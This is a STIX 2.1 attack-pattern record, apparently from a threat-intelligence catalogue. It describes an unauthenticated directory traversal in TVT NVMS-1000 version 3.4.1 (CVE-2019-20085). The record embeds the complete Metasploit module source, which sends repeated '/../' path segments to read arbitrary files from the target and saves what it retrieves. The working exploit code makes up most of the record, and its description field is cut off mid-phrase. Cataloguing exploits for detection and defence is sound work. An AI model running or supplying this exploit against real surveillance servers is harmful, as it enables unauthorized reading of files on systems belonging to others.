{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9827de4f-f391-4e30-89f6-c35b9776d903",
    "created": "2024-08-14T16:29:14.657154Z",
    "modified": "2024-08-14T16:29:14.657157Z",
    "name": "TVT NVMS-1000 Directory Traversal",
    "description": " This module exploits an unauthenticated directory traversal vulnerability which exists in TVT network surveillance management software-1000 version 3.4.1. NVMS listens by default on port 80.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/tvt_nvms_traversal.rb",
            "external_id": "tvt_nvms_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'TVT NVMS-1000 Directory Traversal',\n      'Description' => %q{\n        This module exploits an unauthenticated directory traversal vulnerability which\n        exists in TVT network surveillance management software-1000 version 3.4.1.\n        NVMS listens by default on port 80.\n      },\n      'References'  =>\n        [\n          ['CVE', '2019-20085'],\n          ['EDB', '47774']\n        ],\n      'Author'      =>\n        [\n          'Numan T\u00fcrle', # Vulnerability discovery\n          'Dhiraj Mishra' # Metasploit module\n        ],\n      'DisclosureDate' => '2019-12-12',\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('FILEPATH', [true, \"The path to the file to read\", '/windows/win.ini']),\n        OptString.new('TARGETURI', [true, \"The base URI path of nvms\", '/']),\n        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ])\n      ])\n  end\n\n  def run_host(ip)\n    filename = datastore['FILEPATH']\n    traversal = normalize_uri(target_uri.path, '/../' * datastore['DEPTH'], filename)\n\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => traversal\n    })\n\n    unless res && res.code == 200\n      print_error('Nothing was downloaded')\n      return\n    end\n\n    print_good(\"#{peer} - Downloaded #{res.body.length} bytes\")\n    path = store_loot(\n      'nvms.traversal',\n      'text/plain',\n      ip,\n      res.body,\n      filename\n    )\n    print_good(\"File saved in: #{path}\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-12-12"
}